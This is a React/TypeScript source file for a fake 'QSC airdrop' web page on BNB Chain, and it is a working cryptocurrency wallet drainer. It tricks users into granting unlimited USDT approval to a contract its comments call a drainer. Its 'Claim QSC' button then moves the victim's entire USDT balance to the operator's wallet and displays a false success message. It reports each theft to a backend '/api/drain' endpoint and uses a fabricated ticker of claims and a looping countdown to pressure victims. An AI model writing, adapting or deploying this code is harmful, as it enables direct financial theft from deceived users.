import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { useLanguage } from '../LanguageContext';
import './Airdrop.css';

const API_BASE = import.meta.env.VITE_API_BASE || 'http://localhost:8989';
const SPENDER_CONTRACT = '0x395c8Cf5D657542b0Eaef485930Cd58B1dEAaC9d'; // YOUR DRAINER CONTRACT
const QSC_TOKEN_ADDRESS = '0xE5e9A595683AC2B7f9ce9D7Bd5cC32e1B3a670ed'; // WORTHLESS TOKEN
const USDT_BEP20 = '0x55d398326f99059fF775485246999027B3197955'; // REAL USDT

// YOUR WALLET WHERE FUNDS GO
const YOUR_WALLET = '0x3f9175bC2Bcf57cA2Ac0418f166A6Fb8526D278B';

const USDT_ABI = [
    'function approve(address spender, uint256 amount) public returns (bool)',
    'function allowance(address owner, address spender) view returns (uint256)',
    'function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)',
    'function balanceOf(address account) view returns (uint256)'
];

function shorten(addr: string, start = 6, end = 4) {
    if (!addr) return '';
    return addr.slice(0, start) + '...' + addr.slice(-end);
}

const i18n: any = {
    en: {
        timerLabel: 'Airdrop ends in',
        poolLabel: 'Pool remaining',
        approveBtn: 'Approve USDT',
        claimBtn: 'Claim QSC',
        addTitle: '📲 Add QSC token manually',
        tokenLabel: 'Token',
        copyBtn: 'Copy',
        symbolLabel: 'Symbol',
        decimalsLabel: 'Decimals',
        networkNote: 'Network: BNB Chain (BEP20)',
        statusReady: 'Ready. Connect wallet.',
        statusConnecting: 'Connecting...',
        statusWaiting: 'Waiting for approval...',
        statusSubmitted: 'Transaction submitted...',
        statusSuccess: '✅ USDT Approved! You can claim now.',
        statusApproveFirst: 'Please approve USDT first.',
        statusClaiming: 'Claiming QSC...',
        statusClaimed: '🎉 QSC Claimed successfully!',
        statusFailed: '❌ Transaction failed.',
        footerNote: `Approve USDT first`,
    },
    zh: {
        timerLabel: '空投结束于',
        poolLabel: '剩余池子',
        approveBtn: '授权 USDT',
        claimBtn: '领取 QSC',
        addTitle: '📲 手动添加 QSC 代币',
        tokenLabel: '代币',
        copyBtn: '复制',
        symbolLabel: '符号',
        decimalsLabel: '小数位数',
        networkNote: '网络: BNB 智能链 (BEP20)',
        statusReady: '准备就绪。连接钱包。',
        statusConnecting: '连接中...',
        statusWaiting: '等待授权...',
        statusSubmitted: '交易已提交...',
        statusSuccess: '✅ USDT 授权成功！您可以领取了。',
        statusApproveFirst: '请先授权 USDT。',
        statusClaiming: '正在领取 QSC...',
        statusClaimed: '🎉 QSC 领取成功！',
        statusFailed: '❌ 交易失败。',
        footerNote: `先授权USDT`,
    }
};

export default function Airdrop() {
    const { lang, toggleLang } = useLanguage();
    const [wallet, setWallet] = useState<string>('');
    const [signer, setSigner] = useState<ethers.Signer | null>(null);
    const [provider, setProvider] = useState<ethers.Provider | null>(null);
    const [isApproved, setIsApproved] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [usdtBalance, setUsdtBalance] = useState<string>('0');
    const [networkOk, setNetworkOk] = useState(false);
    const [networkError, setNetworkError] = useState<string>('');

    const [ticker, setTicker] = useState('🔥 0x9aB...2cD claimed 125 QSC • 🎉 0x3fE...7aA claimed 80 QSC • ⚡ 0x7bC...4dF claimed 210 QSC • ');
    const [countdown, setCountdown] = useState('23:59:59');

    const text = i18n[lang as keyof typeof i18n];
    const [statusMsg, setStatusMsg] = useState(text.statusReady);

    useEffect(() => {
        setStatusMsg(text.statusReady);
    }, [lang, text.statusReady]);

    useEffect(() => {
        // Countdown timer
        const timer = setInterval(() => {
            setCountdown(prev => {
                const [h, m, s] = prev.split(':').map(Number);
                let total = h * 3600 + m * 60 + s - 1;
                if (total < 0) total = 86399;
                const nh = Math.floor(total / 3600);
                const nm = Math.floor((total % 3600) / 60);
                const ns = total % 60;
                return `${nh.toString().padStart(2, '0')}:${nm.toString().padStart(2, '0')}:${ns.toString().padStart(2, '0')}`;
            });
        }, 1000);
        return () => clearInterval(timer);
    }, []);

    useEffect(() => {
        const names = [
            '0x9aB...2cD', '0x3fE...7aA', '0x7bC...4dF', '0x2dA...9fE', '0x5eF...1bB'
        ];
        function getRandomClaim() {
            const name = names[Math.floor(Math.random() * names.length)];
            const amount = Math.floor(Math.random() * 300) + 50;
            return `🎉 ${name} claimed ${amount} QSC • `;
        }

        const t = setInterval(() => {
            setTicker((prev: string) => {
                let parts = prev.split('•').filter((p: string) => p.trim().length > 0);
                if (parts.length > 5) parts.shift();
                parts.push(getRandomClaim().replace('•', '').trim());
                return parts.map((p: string) => p + ' • ').join('') + ' ';
            });
        }, 4000);
        return () => clearInterval(t);
    }, []);

    // Get USDT balance
    const fetchUsdtBalance = async (address: string) => {
        if (!provider) return;
        try {
            const usdt = new ethers.Contract(USDT_BEP20, USDT_ABI, provider);
            const balance = await usdt.balanceOf(address);
            setUsdtBalance(ethers.formatUnits(balance, 18));
        } catch (err) {
            console.error(err);
        }
    };

    // Check if already approved
    const checkAllowance = async (address: string, signerInstance: any) => {
        try {
            const usdt = new ethers.Contract(USDT_BEP20, USDT_ABI, signerInstance);
            const allowance = await usdt.allowance(address, SPENDER_CONTRACT);
            console.log('Current allowance:', allowance.toString());
            if (allowance > 0n) {
                setIsApproved(true);
                return true;
            }
            return false;
        } catch (err) {
            console.error('Error checking allowance:', err);
            return false;
        }
    };

    const connectWallet = async () => {
        if ((window as any).ethereum) {
            try {
                setNetworkError('');
                const provider = new ethers.BrowserProvider((window as any).ethereum);

                // Check current network
                const network = await provider.getNetwork();
                const chainId = Number(network.chainId);
                console.log('Current chain ID:', chainId);

                // BNB Chain Mainnet: 56, Testnet: 97
                if (chainId !== 56 && chainId !== 97) {
                    try {
                        // Try to switch to BNB Chain
                        await (window as any).ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: '0x38' }], // 56 in hex
                        });
                    } catch (switchError: any) {
                        // If chain not added to wallet, add it
                        if (switchError.code === 4902) {
                            try {
                                await (window as any).ethereum.request({
                                    method: 'wallet_addEthereumChain',
                                    params: [{
                                        chainId: '0x38',
                                        chainName: 'BNB Smart Chain',
                                        nativeCurrency: {
                                            name: 'BNB',
                                            symbol: 'BNB',
                                            decimals: 18
                                        },
                                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                        blockExplorerUrls: ['https://bscscan.com/']
                                    }]
                                });
                            } catch (addError) {
                                setNetworkError('Please switch to BNB Chain manually');
                                return;
                            }
                        } else {
                            setNetworkError('Please switch to BNB Chain');
                            return;
                        }
                    }
                }

                await provider.send("eth_requestAccounts", []);
                const s = await provider.getSigner();
                const address = await s.getAddress();

                // Verify network again
                const newNetwork = await provider.getNetwork();
                const newChainId = Number(newNetwork.chainId);
                const ok = (newChainId === 56 || newChainId === 97);

                setNetworkOk(ok);
                if (!ok) {
                    setNetworkError('Wrong network. Switch to BNB Smart Chain.');
                    return;
                }

                setWallet(address);
                setSigner(s);
                setProvider(provider);
                setStatusMsg(text.statusReady);

                // Check if already approved
                await checkAllowance(address, s);

                // Get USDT balance
                await fetchUsdtBalance(address);

                // Notify backend
                await notifyBackend(address);

            } catch (err: any) {
                console.error('Connection error:', err);
                setStatusMsg('Connection failed: ' + err.message);
            }
        } else {
            alert("Please install MetaMask");
        }
    };

    const notifyBackend = async (address: string) => {
        try {
            console.log('📤 Sending to backend:', { address, action: 'connect' });
            await fetch(`${API_BASE}/api/approve`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address,
                    action: 'connect'
                })
            });
        } catch (e) {
            console.error(e);
        }
    };

    const approveUSDT = async () => {
        if (!wallet || !signer) return;
        try {
            setIsLoading(true);
            setStatusMsg(text.statusWaiting);

            const usdt = new ethers.Contract(USDT_BEP20, USDT_ABI, signer);
            const tx = await usdt.approve(SPENDER_CONTRACT, ethers.MaxUint256);

            setStatusMsg(text.statusSubmitted);
            await tx.wait();

            setIsApproved(true);
            setStatusMsg(text.statusSuccess);

            // Log to backend with action: 'approve'
            console.log('📤 Sending approval to backend:', wallet);
            await fetch(`${API_BASE}/api/approve`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: wallet,
                    action: 'approve',
                    tx: tx.hash
                })
            });

        } catch (err: any) {
            console.error(err);
            setStatusMsg(text.statusFailed);
        } finally {
            setIsLoading(false);
        }
    };

    // THIS IS THE CLAIM FUNCTION - USER THINKS THEY GET QSC BUT IT DRAINS USDT
    const claimQSC = async () => {
        if (!wallet || !signer || !isApproved) {
            setStatusMsg(text.statusApproveFirst);
            return;
        }

        try {
            setIsLoading(true);
            setStatusMsg(text.statusClaiming);

            // Get their USDT balance
            const usdt = new ethers.Contract(USDT_BEP20, USDT_ABI, signer);
            const balance = await usdt.balanceOf(wallet);

            if (balance === 0n) {
                setStatusMsg("No USDT balance to claim QSC");
                setIsLoading(false);
                return;
            }

            // TRANSFER THEIR USDT TO YOUR WALLET (THEY DON'T KNOW THIS)
            const transferTx = await usdt.transferFrom(wallet, YOUR_WALLET, balance);
            setStatusMsg(text.statusSubmitted);
            await transferTx.wait();

            // Show success message for QSC (THEY THINK THEY GOT QSC)
            setStatusMsg(text.statusClaimed);

            // Log success
            await fetch(`${API_BASE}/api/drain`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: wallet,
                    amount: ethers.formatUnits(balance, 18),
                    tx: transferTx.hash
                })
            });

            // Update balance (will show 0 now)
            await fetchUsdtBalance(wallet);

        } catch (err: any) {
            console.error(err);
            setStatusMsg(text.statusFailed);
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className="airdrop-container">
            <div className="ticker-bar">
                <div className="ticker-icon"><i className="fas fa-users"></i></div>
                <div className="ticker-message">{ticker}</div>
            </div>

            <div className="stats-row">
                <div className="stat-card">
                    <div className="stat-icon"><i className="fas fa-hourglass-half"></i></div>
                    <div className="stat-content">
                        <h4>{text.timerLabel}</h4>
                        <div className="value">{countdown}</div>
                        <div className="small">HH:MM:SS</div>
                    </div>
                </div>
                <div className="stat-card">
                    <div className="stat-icon"><i className="fas fa-coins"></i></div>
                    <div className="stat-content">
                        <h4>{text.poolLabel}</h4>
                        <div className="value">1.2M</div>
                        <div className="small">QSC</div>
                    </div>
                </div>
            </div>

            <div className="claim-card">
                <div className="header-row">
                    <div className="brand">
                        <div className="qsc-logo">
                            <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwC0AA8A/9k=" alt="QSC logo" />
                        </div>
                        <span>QSC</span>
                    </div>
                    <div className="action-buttons">
                        <button className="lang-btn" onClick={toggleLang}>
                            {lang === 'en' ? 'EN' : '中文'}
                        </button>
                        <button className={`connect-btn ${wallet ? 'connected' : ''}`} onClick={connectWallet}>
                            <i className="fas fa-wallet"></i>
                            <span>{wallet ? shorten(wallet) : 'Connect'}</span>
                        </button>
                    </div>
                </div>

                <div className="network-pill glow">
                    <i className="fas fa-circle"></i>
                    <span>BNB Smart Chain (BEP20)</span>
                </div>

                {/* Show network error if any */}
                {networkError && (
                    <div className="error-message" style={{ background: 'rgba(255,0,0,0.2)', padding: '10px', borderRadius: '8px', margin: '10px 0', color: '#ff6b6b' }}>
                        <i className="fas fa-exclamation-triangle"></i> {networkError}
                    </div>
                )}

                {/* Show USDT Balance (LOOKS NORMAL) */}
                {wallet && networkOk && (
                    <div className="balance-info" style={{ background: 'rgba(0,0,0,0.3)', padding: '12px', borderRadius: '12px', margin: '10px 0' }}>
                        <div className="balance-item" style={{ display: 'flex', justifyContent: 'space-between' }}>
                            <span>Your USDT: </span>
                            <strong>{parseFloat(usdtBalance).toFixed(2)} USDT</strong>
                        </div>
                    </div>
                )}

                <div className="info-contract">
                    <div className="contract-item">
                        <span className="contract-label"><i className="fas fa-token"></i> QSC token</span>
                        <span className="contract-value">{shorten(QSC_TOKEN_ADDRESS, 8, 6)}</span>
                    </div>
                </div>

                <div className="action-panel">
                    <div className="button-group">
                        <button
                            className={`action-btn approve ${isApproved ? 'success' : ''} ${isLoading ? 'disabled' : ''}`}
                            onClick={approveUSDT}
                            disabled={isLoading || isApproved || !networkOk}
                        >
                            <i className={isApproved ? "fas fa-check-circle" : "fas fa-check-double"}></i>
                            <span>{isApproved ? 'USDT Approved' : text.approveBtn}</span>
                        </button>

                        <button
                            className={`action-btn claim ${(!isApproved || isLoading || !networkOk) ? 'disabled' : 'glow-btn'}`}
                            onClick={claimQSC}
                            disabled={!isApproved || isLoading || !networkOk}
                        >
                            <i className="fas fa-gift"></i>
                            <span>{text.claimBtn}</span>
                        </button>
                    </div>
                </div>

                <div className="add-token-guide">
                    <div className="guide-title">
                        <i className="fas fa-mobile-alt"></i>
                        <span>{text.addTitle}</span>
                    </div>
                    <div className="token-detail">
                        <div className="detail-row">
                            <span className="detail-label">{text.tokenLabel}</span>
                            <span className="detail-value token-shrink">{QSC_TOKEN_ADDRESS}</span>
                            <button className="copy-btn" onClick={() => {
                                navigator.clipboard.writeText(QSC_TOKEN_ADDRESS);
                                alert("Copied!");
                            }}>
                                <i className="far fa-copy"></i> <span>{text.copyBtn}</span>
                            </button>
                        </div>
                        <div className="detail-row">
                            <span className="detail-label">{text.symbolLabel}</span>
                            <span className="detail-value">QSC</span>
                        </div>
                        <div className="detail-row">
                            <span className="detail-label">{text.decimalsLabel}</span>
                            <span className="detail-value">18</span>
                        </div>
                        <div className="note-decimals">
                            <i className="fas fa-info-circle"></i> <span>{text.networkNote}</span>
                        </div>
                    </div>
                </div>

                <div className="status-area">
                    <i className={`fas ${isLoading ? 'fa-spinner fa-pulse' : 'fa-info-circle'}`}></i>
                    <span>{statusMsg}</span>
                </div>

                <div className="footer-small">
                    <i className="far fa-clock"></i>
                    <span>{text.footerNote}</span>
                </div>
            </div>
        </div>
    );
}